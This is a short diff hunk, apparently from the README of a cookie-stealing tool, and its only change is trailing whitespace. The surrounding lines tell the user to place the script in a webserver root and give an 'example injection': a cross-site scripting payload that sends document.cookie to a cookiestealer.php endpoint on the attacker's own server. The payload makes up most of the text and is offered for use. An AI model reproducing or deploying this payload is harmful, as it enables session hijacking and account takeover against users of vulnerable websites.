@@ -4,7 +4,7 @@ Place in your webserver root folder, give permissions and start server
 
 example injection:
 
-<script>
+<script> 
 var i = new Image();
 i.src="http://your_server.site/cookiestealer.php?g="+document.cookie;
 </script>
